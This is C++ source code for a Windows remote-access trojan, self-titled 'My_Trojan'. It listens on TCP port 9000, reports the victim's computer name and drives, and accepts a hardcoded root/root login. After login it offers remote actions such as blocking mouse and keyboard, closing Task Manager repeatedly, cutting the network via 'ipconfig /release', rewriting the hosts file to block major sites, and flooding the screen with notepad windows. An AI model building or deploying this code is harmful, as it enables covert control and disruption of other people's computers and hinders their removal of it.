
#include <iostream> // input output standard
#include <windows.h> // windows library
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ws2_32.lib")
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <shlobj.h>

#define BUFFERSIZE 512
#define PROTOPORT 9000

int optionInput;
HWND taskManager, sysError, windowsMediaPlayer, autoPlay, visualBasicScriptEdition, windowDrive;
CRITICAL_SECTION cs;

// prototype
DWORD WINAPI client_thread(LPVOID);
DWORD WINAPI hide_error_popup(LPVOID);
DWORD WINAPI chat_ai_with_server(LPVOID);
DWORD WINAPI block_mouse_keyboard(LPVOID);
DWORD WINAPI spam_beep(LPVOID);
DWORD WINAPI change_foreground_windows_title(LPVOID);
DWORD WINAPI turn_off_monitor(LPVOID);
DWORD WINAPI swap_mouse_buttons(LPVOID);
DWORD WINAPI crazy_mouse(LPVOID);
DWORD WINAPI open_a_website(LPVOID);
DWORD WINAPI disable_taskbar(LPVOID);
DWORD WINAPI message_box_error(LPVOID);
DWORD WINAPI hide_current_window(LPVOID);
DWORD WINAPI play_a_sound(LPVOID);
DWORD WINAPI disable_internet(LPVOID);
DWORD WINAPI open_close_cd_drive(LPVOID);
DWORD WINAPI notepad_bomber(LPVOID);
DWORD WINAPI edit_hosts_block_sites(LPVOID);
DWORD WINAPI open_app(LPVOID);

int main() {

    // FreeConsole();
    system("title :.My_Trojan.:");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&hide_error_popup, 0, 0, NULL);

    // initilize socket
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    InitializeCriticalSection(&cs);

    SOCKADDR_IN addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(PROTOPORT);

    SOCKET listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    bind(listener, (SOCKADDR*)&addr, sizeof(addr));
    listen(listener, SOMAXCONN);

    while (1) {
        printf("Waiting for being attacked!\n");
        SOCKET client = accept(listener, NULL, NULL);
        printf("New connection: %d\n", client);
        CreateThread(NULL, 0, client_thread, &client, 0, NULL);
    }

    DeleteCriticalSection(&cs);

    WSACleanup();
    system("pause");
    return 0;
}


DWORD WINAPI client_thread(LPVOID lpParam) {

    SOCKET client = *(SOCKET*)lpParam;

    char buf[BUFFERSIZE];
    char username[32], password[32];

    int returnValue;


    int n = 0;

    char computerName[64];
    DWORD computerNameLength;
    GetComputerNameA(computerName, &computerNameLength + 1);
    memcpy(buf, computerName, sizeof(computerName));
    printf("\n%s\n", buf);
    sprintf_s(buf, "\nVictim's Computer: %s\n", computerName);
    send(client, buf, strlen(buf), 0);


    char driveString[64];
    DWORD sectorsPerCluster, bytesPerSector, numberOfFreeClusters, totalNumberOfClusters;

    returnValue = GetLogicalDriveStringsA(sizeof(driveString), (LPSTR)driveString);

    for (int i = 0; i < returnValue / 4; i++) {
        printf("%c: ", driveString[i * 4]);
        GetDiskFreeSpaceA(&driveString[i * 4], &sectorsPerCluster, &bytesPerSector, &numberOfFreeClusters, &totalNumberOfClusters);
        float totalBytes = (float)totalNumberOfClusters * (float)sectorsPerCluster * (float)bytesPerSector / (float)(1 << 30);
        printf("%f\n", totalBytes);
        sprintf_s(buf, "Drive %c: %f\n", driveString[i * 4], totalBytes);
        send(client, buf, strlen(buf), 0);
    }




    // send welcome message to client
    const char* welcomeServer = "\nInsert: [username] [password]\n";
    send(client, welcomeServer, strlen(welcomeServer), 0);

    while (1) {

        send(client, "Insert: ", 8, 0);
        returnValue = recv(client, buf, sizeof(buf), 0);

        if (returnValue <= 0) {
            closesocket(client);
            return 0;
        }

        buf[returnValue - 1] = '\0'; // Add \0 so printf knows where to stop
        printf("Received: %s\n", buf); // print the echo buffer


        returnValue = sscanf_s(buf, "%s %s", username, sizeof(username), password, sizeof(password));

        if (returnValue == 2) {
            if (strcmp(username, "root") == 0 && strcmp(password, "root") == 0) {
                const char* successMsg = "\nLet\'s explore Trojan!\n";
                send(client, successMsg, strlen(successMsg), 0);
                break;
            }
            else {
                printf("Someone tried to access your trojan!\n");
                send(client, "Wrong info!\n", 12, 0);
            }
        }
        else {
            const char* errorMsg = "Error syntax for logging in!\n";
            send(client, errorMsg, strlen(errorMsg), 0);
        }
       
    }


    while (1) {

        char number[32], letter[BUFFERSIZE];
        const char* optionMessage = "\nChoose option:\n1. Chat with server\n2. Block mouse keyboard\n3. Spam beep\n4. Change foreground title\n5. Turn off monitor\n6. Swap mouse\n7. Crazy mouse\n8. Open website\n9. Disable taskbar\n10. Message box error\n11. Hide current window\n12. Play a sound wav\n13. Disable internet\n14. Open close CD\n15. Notepad bomber\n16. Edit hosts block sites\n17. Open app\n";
        send(client, optionMessage, strlen(optionMessage), 0);

        returnValue = recv(client, buf, sizeof(buf), 0);

        if (returnValue <= 0) {
            closesocket(client);
            return 0;
        }

        buf[returnValue] = '\0';
        printf("Received: %s\n", buf);

        sscanf_s(buf, "%s %s", number, sizeof(number), letter, sizeof(letter));
        optionInput = atoi(number);

        if (optionInput == 1) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&chat_ai_with_server, 0, 0, NULL);
        }
        else if (optionInput == 2) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&block_mouse_keyboard, 0, 0, NULL);
        }
        else if (optionInput == 3) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&spam_beep, 0, 0, NULL);
        }
        else if (optionInput == 4) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&change_foreground_windows_title, 0, 0, NULL);
        }
        else if (optionInput == 5) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&turn_off_monitor, 0, 0, NULL);
        }
        else if (optionInput == 6) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&swap_mouse_buttons, 0, 0, NULL);
        }
        else if (optionInput == 7) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&crazy_mouse, 0, 0, NULL);
        }
        else if (optionInput == 8) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&open_a_website, letter, 0, NULL);
        }
        else if (optionInput == 9) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&disable_taskbar, 0, 0, NULL);
        }
        else if (optionInput == 10) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&message_box_error, 0, 0, NULL);
        }
        else if (optionInput == 11) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&hide_current_window, 0, 0, NULL);
        }
        else if (optionInput == 12) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&play_a_sound, 0, 0, NULL);
        }
        else if (optionInput == 13) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&disable_internet, 0, 0, NULL);
        }
        else if (optionInput == 14) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&open_close_cd_drive, 0, 0, NULL);
        }
        else if (optionInput == 15) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&notepad_bomber, 0, 0, NULL);
        }
        else if (optionInput == 16) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&edit_hosts_block_sites, 0, 0, NULL);
        }
        else if (optionInput == 17) {
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&open_app, 0, 0, NULL);
        }
    }
}

DWORD WINAPI hide_error_popup(LPVOID) {

    while (1) {

        // obvious
        taskManager = FindWindow(NULL, L"Window Task Manager");
        // may popup with new hardware installation
        sysError = FindWindow(NULL, L"System Settings Change");
        // may popup with windows media player
        windowsMediaPlayer = FindWindow(NULL, L"Windows Media Player");
        // auto play
        autoPlay = FindWindow(NULL, L"AutoPlay");
        // errors caused by our visual basic script edition
        visualBasicScriptEdition = FindWindow(NULL, L"Windows Script Host");

        if (taskManager != NULL) {
            SetWindowText(taskManager, L"DIE!!!!!!");
            Sleep(500);
            PostMessage(taskManager, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }

        if (sysError != NULL) {
            Sleep(1000);
            PostMessage(sysError, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }

        if (windowsMediaPlayer != NULL) {
            PostMessage(windowsMediaPlayer, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }

        if (autoPlay != NULL) {
            PostMessage(autoPlay, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }

        if (visualBasicScriptEdition != NULL) {
            PostMessage(visualBasicScriptEdition, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }

        Sleep(500);

    }
}

DWORD WINAPI chat_ai_with_server(LPVOID) {
    return 0;
}


DWORD WINAPI block_mouse_keyboard(LPVOID) {
    BlockInput(true);
    Sleep(60000);
    return 0;
}

DWORD WINAPI spam_beep(LPVOID) {
    int i, j;
    for (int temp = 0; temp < 2001; temp++) {
        i = rand() % 2001;
        j = rand() % 501;
        Beep(i, j);
    }
    return 0;
}

DWORD WINAPI change_foreground_windows_title(LPVOID) {
    HWND window = GetForegroundWindow();
    SetWindowText(window, L"I'm Useful Trojan!");
    Sleep(10000);
    return 0;
}

DWORD WINAPI turn_off_monitor(LPVOID) {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
    Sleep(2000);
    return 0;
}

DWORD WINAPI swap_mouse_buttons(LPVOID) {
    SwapMouseButton(true);
    return 0;
}

DWORD WINAPI crazy_mouse(LPVOID) {
    int i, j;
    for (int temp = 0; temp < 201; temp++) {
        i = rand() % 1001;
        j = rand() % 801;
        SetCursorPos(i, j);
        Sleep(200);
    }
    return 0;
}

DWORD WINAPI open_a_website(LPVOID lp) {
    //wchar_t* website = (wchar_t*)lp;
    ShellExecute(NULL, L"open", L"https://google.com", NULL, NULL, SW_MAXIMIZE);
    return 0;
}

DWORD WINAPI disable_taskbar(LPVOID) {
    HWND hardwareWindow = FindWindow(L"Shell_TrayWnd", NULL);
    EnableWindow(hardwareWindow, false);
    ShowWindow(hardwareWindow, false);
    return 0;
}

DWORD WINAPI message_box_error(LPVOID) {
    MessageBox(NULL, TEXT("Error loading!"), TEXT("Failed"), MB_OK | MB_ICONEXCLAMATION);
    return 0;
}

DWORD WINAPI hide_current_window(LPVOID) {
    HWND hardwareWindow = GetForegroundWindow();
    ShowWindow(hardwareWindow, false);
    return 0;
}

DWORD WINAPI play_a_sound(LPVOID) {

    PlaySound(TEXT("C:\\testcase.wav"), NULL, SND_FILENAME | SND_ASYNC);
    return 0;

    /*******************************************************

    PlaySound("MouseClick", NULL, SND_LOOP | SND_SYNC);
    PlaySound("*.wav", GetModuleHandle(NULL), SND_FILENAME);
    sndPlaySound("*.wav", SND_FILENAME);
    PlaySound("*.wav", GetModuleHandle(NULL), SND_FILENAME | SND_ASYNC);
    or
    sndPlaySound("*.wav", SND_FILENAME | SND_ASYNC);
    PlaySound("*.wav", GetModuleHandle(NULL), SND_FILENAME | SND_ASYNC | SND_LOOP);
    or
    sndPlaySound("*.wav", SND_FILENAME | SND_ASYNC | SND_LOOP);

    mciSendString("open \"*.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
    mciSendString("play mp3 wait", NULL, 0, NULL);
    mciSendString("play mp3 from 0", NULL, 0, NULL);
    mciSendString("play mp3 from 0 wait", NULL, 0, NULL);
    mciSendString("play mp3 repeat", NULL, 0, NULL);
    mciSendString("play mp3 repeat notify", NULL, 0, hwnd); //or MAKELONG(hwnd, 0) instead
    mciSendString("pause mp3", NULL, 0, NULL);
    mciSendString("resume mp3", NULL, 0, NULL);
    mciSendString("stop mp3", NULL, 0, NULL);
    mciSendString("play mp3 notify", NULL, 0, hwnd); //hwnd is an handle to the window returned from CreateWindowEx. If this doesn't work, then replace the hwnd with MAKELONG(hwnd, 0).

    *******************************************************/
}

DWORD WINAPI disable_internet(LPVOID) {
    system("ipconfig /release");
    return 0;
}

DWORD WINAPI open_close_cd_drive(LPVOID) {
    mciSendString(L"set CDAudio door open", NULL, 0, NULL);
    Sleep(2000);
    mciSendString(L"set CDAudio door closed", NULL, 0, NULL);
    Sleep(5000);
    return 0;
}

DWORD WINAPI notepad_bomber(LPVOID) {
    for (int i = 0; i < 1001; i++) {
        ShellExecute(NULL, L"open", L"notepad.exe", NULL, NULL, SW_MAXIMIZE);
    }
    return 0;
}

DWORD WINAPI edit_hosts_block_sites(LPVOID) {
    char* pValue;
    size_t len;
    FILE* fp;
    int i;
    char ip[] = "0.0.0.0";

    /* Add your sites in the below list. */
    const char* blist[] = {
    "www.orkut.com",
    "orkut.com",
    "www.google.com",
    "google.com",
    "www.google.co.in",
    "google.co.in",
    "www.gmail.com",
    "gmail.com",
    "www.facebook.com",
    "facebook.com",
    "www.yahoo.com",
    "yahoo.com",
    "www.twitter.com",
    "twitter.com",
    "#"
    };

    /*strcpy_s(hosts_file_path, sizeof(hosts_file_path), _dupenv_s(&pValue, &len, "SystemRoot"));
    strcat_s(hosts_file_path, "\\system32\\drivers\\etc\\hosts");*/
    const char* hosts_file_path = "C:\\Windows\\system32\\drivers\\etc\\hosts";

    if ((fopen_s(&fp, hosts_file_path, "a")) == NULL)
        return 0;

    fputs("\n", fp);
    for (i = 0; blist[i][0] != '#'; i++)
    {
        fputs(ip, fp);
        fputs("        ", fp);
        fputs(blist[i], fp);
        fputs("\n", fp);
    }

    fclose(fp);
    system("echo ' '");
    return 0;
}

DWORD WINAPI open_app(LPVOID) {
    ShellExecute(NULL, L"open", L"C:\\Program Files\\Sublime Text 3\\sublime_text.exe", NULL, NULL, SW_MAXIMIZE);
    return 0;
}
